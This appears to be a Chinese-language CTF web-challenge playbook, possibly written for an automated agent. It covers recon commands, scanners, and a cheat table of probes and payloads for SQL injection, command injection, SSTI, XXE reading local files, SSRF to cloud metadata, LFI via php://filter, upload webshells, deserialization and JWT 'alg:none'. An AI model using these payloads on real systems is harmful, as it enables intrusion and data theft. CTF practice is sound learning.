# Web 网站安全 playbook

## 0. 先做三件事(30 秒内)
```bash
curl -i http://TARGET/                 # 响应头/框架/重定向
curl -s http://TARGET/robots.txt; curl -s http://TARGET/sitemap.xml
curl -s http://TARGET/ | grep -oiE 'href="[^"]+"' | sort -u | head -30
```
附件是源码时**先通读源码找路由与危险函数**,比盲测快得多:
```bash
grep -rnE "eval|exec|system|popen|include|unserialize|pickle|render_template" .
```

## 1. 常见漏洞速查
| 类型 | 探测 | 利用要点 |
|---|---|---|
| SQL 注入 | `'`、`'||'`、报错/延时 | 联合查询;`sqlmap -u URL --batch --dbs`(本机可用) |
| 命令注入 | `;id`、`|id`、`$(id)` | 空格被过滤用 `$IFS`、`${PATH:0:1}`;绕 WAF 用 base64 |
| SSTI | `{{7*7}}`、`${7*7}`、`<%= 7*7 %>` | Jinja2 `{{''.__class__.__mro__[1].__subclasses__()}}` |
| XXE | 提交 XML 试外部实体 | `<!DOCTYPE x [<!ENTITY f SYSTEM "file:///flag">]>` |
| SSRF | URL 参数填 `http://127.0.0.1/`、`file:///etc/passwd` | 云元数据 `169.254.169.254`;绕 `0.0.0.0`、302 |
| LFI | `?file=../../etc/passwd` | `php://filter/convert.base64-encode/resource=index.php` 读源码 |
| 文件上传 | 后缀/内容/双写 | 改 Content-Type、`phtml`、图片马 + 文件包含 |
| 反序列化 | PHP `unserialize`、Python `pickle`、Java `AC ED` | PHP `__destruct`/`__wakeup` 链;Python 造 `__reduce__` |
| JWT | `eyJ` 开头 | `alg:none`、HS256 弱密钥爆破、`kid` 注入 |
| 越权/逻辑 | 改 id、role、price | 遍历 id;注意 0/1 与 UUID |
| 源码泄露 | `.git/`、`www.zip`、`.DS_Store` | 拉 `.git` 后恢复源码 |

## 2. 爆破与扫描(别超时)
```bash
dirsearch -u http://TARGET -e php,html,txt,zip -t 20 --timeout=5    # 本机
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt  # pwn64
nikto -host http://TARGET                                          # pwn64
```
payload 不够时用检索工具:`python3 tools/kb.py search "sql 注入 绕过"`。

## 3. 陷阱与提速
- 容器题服务挂了先点平台「重置环境」。
- 一次只改一个变量,别同时试 5 种 payload。
- **先找 flag 位置再构造完整链**:`/flag`、`/flag.txt`、`env`、数据库 `secret.flag` 表、源码注释。
